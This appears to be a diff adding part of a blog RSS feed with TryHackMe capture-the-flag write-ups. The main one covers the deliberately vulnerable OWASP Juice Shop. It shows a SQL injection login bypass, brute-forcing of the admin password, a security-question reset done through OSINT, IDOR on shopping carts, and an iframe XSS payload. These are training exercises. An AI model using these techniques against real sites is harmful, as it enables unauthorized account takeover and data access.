+&lt;p&gt;We get a hint from the room on question 2. It tells us to check the website. The website files are probably held in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt;. Navigating there we see a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;water-type.txt&lt;/code&gt;. This string appears to be some kind of rotation cipher. Using &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt;, I decoded the rotation cipher and got the flag.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/pokemon/pokemon_water.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;root&quot;&gt;Root&lt;/h2&gt;
+
+&lt;p&gt;Looking around the system in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pokemon&lt;/code&gt; user’s home directory I stumbled on an interesting path in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Videos&lt;/code&gt; directory. At the end of that trail was a file that looked like it gave creds for another user.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/pokemon/pokemon_ash.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;This led me to the final flag, which was in a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roots-pokemon.txt&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/pokemon/pokemon_root.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h2&gt;
+
+&lt;p&gt;Quick room. Honestly, the box was a little messy, but still a fun way to kill a an hour or two. For beginners this is a good way to dip your toes into encryption and navigation of the linux file system as well as some other basic commands. Thanks for reading if you’ve gotten this far!&lt;/p&gt;
+</description>
+        <pubDate>Tue, 11 Aug 2020 00:00:00 -0500</pubDate>
+        <link>http://localhost:8000//Pokemon</link>
+        <link href="http://localhost:8000/Pokemon"/>
+        <guid isPermaLink="true">http://localhost:8000/Pokemon</guid>
+      </item>
+    
+      <item>
+        <title>OWASP Juice Shop Writeup</title>
+        <description>&lt;h1 id=&quot;tryhackme---juice-shop&quot;&gt;TryHackMe - Juice Shop&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;This is a writeup of the OWASP Juice Shop room on &lt;a href=&quot;http://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. This room is a well-known web application used to learn the OWASP top ten web application security risks, and actually has much more to offer than just the tasks given to us in TryHackMe. For that reason, I’ll be adding onto this at the end of the writeup (and hopefully revisit it over time) in order to better my web application pen testing skills. After all, web applications are one of the most enticing ways to gain access to networks.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
+
+&lt;p&gt;Because this is a web application, I’m going to skip the scanning part of this room, and head straight to the web app. Here’s the home page:&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_Home.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The room on THM instructs us to move around the webpage and get a feel for how it works. I’ll list some of the more interesting things I see on initial enumeration. Some of the things I’m looking for are: places that recieve user input, login pages, downloads, etc. Here’s an initial list.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Search bar at the top of the page&lt;/li&gt;
+  &lt;li&gt;Customer Feedback page&lt;/li&gt;
+  &lt;li&gt;Login page&lt;/li&gt;
+  &lt;li&gt;Cookie usage&lt;/li&gt;
+  &lt;li&gt;Recycling box request page&lt;/li&gt;
+  &lt;li&gt;info disclosure under the products, reveals usernames to try to break into&lt;/li&gt;
+  &lt;li&gt;Download on the about us page gives us possible ftp.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;That’s all from the initial messing around which took about ~5-10 minutes. I’m sure that I’ll see more as I dive deeper into the box.&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;injection&quot;&gt;Injection&lt;/h2&gt;
+
+&lt;p&gt;The first task on the webpage is to successfully login to the admin account using SQL injeciton. This particular SQL injection will work by typing malicious input into the login. The web app doesn’t properly sanitize the input, and reads it in such a manner that just lets us waltz right into the admin’s account. The only piece of info we really need, the admin’s email, it can be found in the apple juice product on the homepage. If we click on the product, it gives us the email of whoever has left a review of that product. One has been submitted by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin@juice-sh.op&lt;/code&gt; so we can use that email to login.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+  &lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_admin.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;So the final piece of the SQL injection is to add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;'--&lt;/code&gt; to the end of the admin’s email and then we will be able to type whatever password we want and gain access to the admin’s account. This is due to the input of the special characters being handled poorly. More specifically, the input is being interpreted by SQL as commenting out the password. We get a green notification at the top of the screen when we successfully login as admin.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_adminlogin.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;broken-authentication&quot;&gt;Broken Authentication&lt;/h2&gt;
+
+&lt;p&gt;The next task is broken authentication. We are given the details of exploiting bugs in the authentication process as well as an insecure forgotten password mechanism. We’ll start with resetting Jim’s password. Again, we can verify jim’s email by looking through the products and seeing that a review for the green smoothie has been left by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jim@juice-sh.op&lt;/code&gt;. His comment is also interesting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fresh out of a replicator.&lt;/code&gt;. Doing some basic OSINT by googling the word replicator gives us results for Star Trek.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_replicator.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Being a massive nerd, I can guess that Jim is short for James, as in Captain James T. Kirk. At the login page, there is a link for forgotten passwords. clicking on that leads us to the following screen:&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_forgotten.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see that the security question asks for Jim’s eldest brother’s middle name. Now, I may be a nerd, but I’m not &lt;em&gt;that&lt;/em&gt; much of a nerd, so back to google it is. Turns out that Jim’s oldest brother’s name is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;George Samuel &quot;Sam&quot; Kirk&lt;/code&gt;. There’s the answer to question 1 in task 5, and we can reset the password to whatever we want. I like this challenge because it shows how a little bit of OSINT can really go a long way. It’s also a bit of a warning to not reveal too much personal info online. Obviously this is an extreme case of an insecure web-app, but still.&lt;/p&gt;
+
+&lt;p&gt;The next question asks us what the administrator’s password is. It also provides the hint that sometimes admins pick common passwords. After trying a few common passwords, I went the easy route and used BurpSuite to brute force the admin account with a basic password list and found that the password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin123&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_adminpassword.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;sensitive-data-exposure&quot;&gt;Sensitive Data Exposure&lt;/h2&gt;
+
+&lt;p&gt;The next task deals with sensitive data exposure and the only question here is to access a confidential markdown file. From my initial enumeration, I already had a decent idea about how to access some files. At the about us page we can see a link to the term of use. Hovering over it shows the link in a directory called ftp. So if we edit the URL to include the ftp on the end, we can access all the files on the file share in theory.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_ftp.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;broken-access-control&quot;&gt;Broken Access Control&lt;/h2&gt;
+
+&lt;p&gt;The first question has us access the administration section of the page and then asks when the name is. There are several ways to do this. I simply took a shot in the dark and tried &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administration&lt;/code&gt;, and I got in that way. The more technical way, and the way THM hints at, asks you to take a look at the js files. If you take a look in the web developer tools, you’ll find a js file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.js&lt;/code&gt;. Searching for the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; in the file gives us a path called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administration&lt;/code&gt;.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_administration.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next we have to access someone else’s shopping cart. Currently, I’m still logged in as admin so I’ll head to their shopping cart. Once in the shopping cart, we can take a look at the console again. Going over to the storage section we see a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bid&lt;/code&gt; item. If we change that number, we should be able to look at another cart.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_cart.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Finally, for the this task need to delete all five-star reviews. Back at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administration&lt;/code&gt; page, we can see all the reviews. All we need to do here is delete the only five-star review by clicking on the trash can next to the review.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;cross-site-scripting&quot;&gt;Cross Site Scripting&lt;/h2&gt;
+
+&lt;p&gt;Cross site scripting, also known as XSS, involves injecting malicious JavaScript into a website. There are two kinds of XSS, reflected and non-reflected. Reflected is stored into the server of the web app, and non-reflected is not. This task wants us to perform an attack using the tracking orders, and using the search field. I’ll be using a basic XSS payload that simply shows a popup on the screen, I’ll use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iframe&lt;/code&gt; tag because THM says so.&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;iframe src=&quot;javascript:alert('Hacked By a Trashy Boii')&quot;&amp;gt;&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The first question deals with the Tracking Orders page. Simplay going to the page shows us an input for the order number. If you take a look at the URL at the top of the page, we get an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;...?id=ORDERNUMBER&lt;/code&gt;. If we replace the ORDERNUMBER with our properly formatted payload we should get a reflected XSS attack. Because of the spaces in the string I shortened my message.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_hack.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The payload for the search bar is easier, we can simply paste our xss payload into the search bar and get the following popup.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_hacked.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;after-tryhackme&quot;&gt;After TryHackMe&lt;/h2&gt;
+
+&lt;p&gt;Again, this room is actually a pretty well known application that can teach you all kinds of things about web application security. The creator has a really great and detailed writeup and documentation of not only all the TryHackMe tasks, but other more and less challenging exploits on this application &lt;a href=&quot;https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/&quot;&gt;here&lt;/a&gt;. I’m planning on continuing to spin up this box on THM and play around with it to see what I can find. Thanks for reading!
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Fri, 07 Aug 2020 00:00:00 -0500</pubDate>
+        <link>http://localhost:8000//OWASPJuiceShop</link>
+        <link href="http://localhost:8000/OWASPJuiceShop"/>
+        <guid isPermaLink="true">http://localhost:8000/OWASPJuiceShop</guid>
+      </item>
+    
+  </channel>
+</rss>
